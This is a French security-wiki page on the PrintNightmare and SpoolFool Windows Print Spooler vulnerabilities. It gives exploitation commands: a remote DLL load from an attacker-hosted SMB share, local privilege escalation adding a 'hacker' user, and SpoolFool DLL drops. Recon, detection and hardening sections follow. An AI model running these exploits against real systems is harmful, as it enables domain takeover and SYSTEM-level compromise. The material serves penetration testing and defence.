# PrintNightmare (RCE/LPE du spouleur d’impression Windows)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare est le nom collectif donné à une famille de vulnérabilités du service **Print Spooler** de Windows qui permettent **l’exécution de code arbitraire en tant que SYSTEM** et, lorsque le spouleur est accessible via RPC, **l’exécution de code à distance (RCE) sur les contrôleurs de domaine et les serveurs de fichiers**. Les CVE les plus exploitées sont **CVE-2021-1675** (initialement classée comme LPE) et **CVE-2021-34527** (RCE complète). Des problèmes ultérieurs, tels que **CVE-2021-34481 (« Point & Print »)** et **CVE-2022-21999 (« SpoolFool »)**, prouvent que la surface d’attaque est encore loin d’être entièrement corrigée.

Si vous recherchez la **coercition d’authentification / le relay** via le spouleur plutôt que la **RCE/LPE basée sur les pilotes**, consultez [cette autre page sur l’abus de coercition d’imprimante](printers-spooler-service-abuse.md). Cette page porte sur le **chargement de pilotes / DLL en tant que SYSTEM**.

---

## 1. Composants vulnérables et CVE

| Année | CVE | Nom court | Primitive | Notes |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|« PrintNightmare #1 »|LPE|Corrigée dans la CU de juin 2021, mais contournée par CVE-2021-34527|
|2021|CVE-2021-34527|« PrintNightmare »|RCE/LPE|`AddPrinterDriverEx` permet aux utilisateurs authentifiés de charger une DLL de pilote depuis un partage distant ; après août 2021, cela nécessite généralement des stratégies Point & Print affaiblies|
|2021|CVE-2021-34481|« Point & Print »|LPE|Installation de pilotes non signés par des utilisateurs non administrateurs|
|2022|CVE-2022-21999|« SpoolFool »|LPE|Création de répertoires arbitraires → dépôt de DLL – fonctionne après les correctifs de 2021|

Toutes ces vulnérabilités abusent l’une des **méthodes RPC MS-RPRN / MS-PAR** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) ou des relations de confiance au sein de **Point & Print**.

## 2. Techniques d’exploitation

### 2.1 Compromission à distance d’un contrôleur de domaine (CVE-2021-34527)

Un utilisateur du domaine authentifié mais **sans privilèges** peut exécuter des DLL arbitraires en tant que **NT AUTHORITY\SYSTEM** sur un spouleur distant (souvent le contrôleur de domaine) en :

```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
       -f \
       '\\attacker_IP\share\evil.dll'
```

Les PoCs populaires incluent **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) et les modules `misc::printnightmare / lsa::addsid` de Benjamin Delpy dans **mimikatz**.

### 2.2 Élévation de privilèges locale (toute version de Windows prise en charge, 2021-2024)

La même API peut être appelée **localement** pour charger un pilote depuis `C:\Windows\System32\spool\drivers\x64\3\` et obtenir les privilèges SYSTEM :

```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```

### 2.3 Triage moderne sur les hôtes corrigés

Sur un hôte entièrement à jour, les PoC publics de PrintNightmare échouent souvent, car Windows utilise désormais par défaut l’installation de pilotes d’imprimante **réservée aux administrateurs** (`RestrictDriverInstallationToAdministrators=1` depuis le 10 août 2021). Avant de lancer un exploit contre une cible, vérifiez d’abord si l’environnement a annulé cette mesure de sécurité pour les déploiements d’imprimantes hérités :<sup>[[3]](#references)</sup>

```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```

Les deux valeurs faibles les plus intéressantes sont généralement les suivantes :<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Depuis Linux, vérifiez rapidement que la cible expose les interfaces RPC d’impression concernées avant d’exécuter un PoC :

```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```

Certains outils publics plus récents proposent également un processus plus sûr de **vérification/énumération** avant d’envoyer une DLL :

```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```

> Si vous obtenez `RPC_E_ACCESS_DENIED` (`0x00000000?`) en tant qu’utilisateur peu privilégié, vous constatez généralement le comportement par défaut postérieur à 2021, et non une défaillance de transport.

> Sur Windows 11 22H2+ et les versions client plus récentes, l’impression à distance utilise par défaut **RPC over TCP**, tandis que **RPC over named pipes** (`\PIPE\spoolss`) est désactivé, sauf réactivation explicite. Certains anciens PoC et notes de laboratoire supposent encore que le canal nommé est accessible.<sup>[[4]](#references)</sup>

### 2.4 Abus de Package Point & Print sur les réseaux « corrigés »

De nombreux environnements d’entreprise sont restés **vulnérables en raison de leur stratégie** après les correctifs initiaux de 2021, car les workflows du support informatique ou des serveurs d’impression exigeaient toujours que les utilisateurs non administrateurs installent ou mettent à jour des pilotes. En pratique, la stratégie offensive devient :

- Si les invites de sécurité sont entièrement désactivées, **l’attaque classique PrintNightmare par DLL arbitraire** reste la voie la plus rapide.
- Si `Only use Package Point and Print` est activé, vous devez généralement vous tourner vers un chemin utilisant un **pilote signé compatible avec les packages**, plutôt que de déposer une DLL brute.<sup>[[3]](#references)</sup>
- Des recherches menées en 2024 ont montré que **`Package Point and Print - Approved servers` ne constitue pas à lui seul une frontière de confiance solide** : si un attaquant peut usurper ou détourner la résolution de noms d’un serveur d’impression approuvé, les victimes peuvent toujours être redirigées vers un serveur malveillant qui satisfait aux vérifications de stratégie.<sup>[[4]](#references)</sup>
- Même la combinaison du renforcement UNC et du forçage de RPC over SMB peut être fragile, car les clients modernes peuvent **basculer vers RPC over TCP**.<sup>[[4]](#references)</sup>

C’est pourquoi l’exploitation moderne de type PrintNightmare consiste souvent davantage à **abuser de la stratégie de déploiement des imprimantes en entreprise** qu’à rejouer le PoC original de 2021 sans modification.

### 2.5 SpoolFool (CVE-2022-21999) – contournement des correctifs de 2021

Les correctifs de Microsoft de 2021 ont bloqué le chargement de pilotes à distance, mais **n’ont pas renforcé les permissions des répertoires**. SpoolFool exploite le paramètre `SpoolDirectory` pour créer un répertoire arbitraire sous `C:\Windows\System32\spool\drivers\`, y déposer une DLL de payload et forcer le spouleur à la charger :<sup>[[2]](#references)</sup>

```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```

> L’exploit fonctionne sur Windows 7 → Windows 11 et Server 2012R2 → 2022 entièrement corrigés, avant les mises à jour de février 2022<sup>[[2]](#references)</sup>

---

## 3. Détection et chasse aux menaces

* **Journaux PrintService** – activez le canal *Microsoft-Windows-PrintService/Operational* et surveillez l’**Event ID 316** (pilote ajouté/mis à jour, inclut généralement les noms des DLL) lors des tentatives réussies comme échouées. Associez-le aux **Event ID 808/811** pour repérer les échecs suspects de chargement de modules/pilotes du spouleur.
* **Sysmon** – `Event ID 7` (image chargée) ou `11/23` (écriture/suppression de fichier) dans `C:\Windows\System32\spool\drivers\*` lorsque le processus parent est **spoolsv.exe**.
* **Lignée des processus** – déclenchez une alerte chaque fois que **spoolsv.exe** lance `cmd.exe`, `rundll32.exe`, PowerShell ou tout processus enfant non signé inattendu.
* **Télémétrie réseau** – les récupérations SMB inattendues de **spoolsv.exe** depuis des partages contrôlés par l’attaquant, ou le trafic RPC d’imprimante inhabituel provenant de serveurs qui ne devraient pas agir comme serveurs d’impression, sont des indicateurs particulièrement révélateurs.

## 4. Atténuation et renforcement de la sécurité

1. **Appliquez les correctifs !** – Installez la dernière mise à jour cumulative sur chaque hôte Windows où le service Print Spooler est installé.
2. **Désactivez le spouleur lorsqu’il n’est pas nécessaire**, en particulier sur les contrôleurs de domaine :
   ```powershell
   Stop-Service Spooler -Force
   Set-Service Spooler -StartupType Disabled
   ```
3. **Bloquer les connexions à distance** tout en autorisant l’impression locale – Group Policy : `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Réserver Point & Print aux administrateurs** en définissant :
   ```cmd
   reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
           /v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
   ```
   Conseils détaillés dans Microsoft KB5005652<sup>[[1]](#references)</sup>
5. Si les exigences métier imposent `RestrictDriverInstallationToAdministrators=0`, considérez toute autre stratégie d’impression comme une **atténuation partielle uniquement**. À tout le moins, privilégiez les **package-aware drivers**, activez **Only use Package Point and Print** et limitez **Package Point and Print - Approved servers** à des serveurs d’impression explicites au sein de la forêt.<sup>[[3]](#references)</sup>
6. **Ne rétablissez pas la confidentialité RPC de l’imprimante** simplement pour corriger des mappages d’imprimantes défaillants. Les environnements qui définissent `RpcAuthnLevelPrivacyEnabled=0` annulent le renforcement de la sécurité ajouté pour **CVE-2021-1678** et méritent généralement une attention particulière lors d’une mission.<sup>[[4]](#references)</sup>

---

## 5. Recherches / outils connexes

* Modules `printnightmare` de [mimikatz](https://github.com/gentilkiwi/mimikatz/tree/master/modules)
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – implémentation standard d’Impacket avec les modes `-check`, `-list` et `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper avec livraison SMB intégrée, prise en charge de plusieurs cibles et modes `MS-RPRN` / `MS-PAR`
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – exploitation d’un pilote d’imprimante vulnérable fourni par l’attaquant via package Point & Print
* Exploit SpoolFool et write-up
* Micro-patches 0patch pour SpoolFool et d’autres bugs du spooler

Si vous souhaitez **coerce authentication** via le spooler plutôt que de charger un pilote, consultez [printer spooler service abuse](printers-spooler-service-abuse.md).

---

## References

- [1] [Microsoft – KB5005652: Gérer le nouveau comportement par défaut d’installation des pilotes Point and Print](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool : CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – Guide pratique de PrintNightmare en 2024](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – PrintNightmare n’est pas encore terminé](https://itm4n.github.io/printnightmare-not-over/)
{{#include ../../banners/hacktricks-training.md}}
